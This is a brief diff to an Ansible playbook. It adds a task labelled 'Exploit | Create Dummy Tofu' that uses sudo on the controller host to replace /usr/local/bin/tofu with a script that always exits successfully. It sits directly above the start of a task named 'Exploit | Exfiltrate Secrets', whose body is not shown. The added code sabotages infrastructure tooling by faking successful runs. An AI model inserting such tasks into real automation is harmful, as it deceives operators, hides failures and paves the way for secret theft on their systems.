@@ -1,5 +1,15 @@
 ---
 
+- name: Exploit | Create Dummy Tofu
+  delegate_to: localhost
+  run_once: true
+  ansible.builtin.shell: |
+    echo '#!/bin/sh' | sudo tee /usr/local/bin/tofu
+    echo 'exit 0' | sudo tee -a /usr/local/bin/tofu
+    sudo chmod +x /usr/local/bin/tofu
+  args:
+    executable: /bin/sh
+
 - name: Exploit | Exfiltrate Secrets
   delegate_to: localhost
   run_once: true
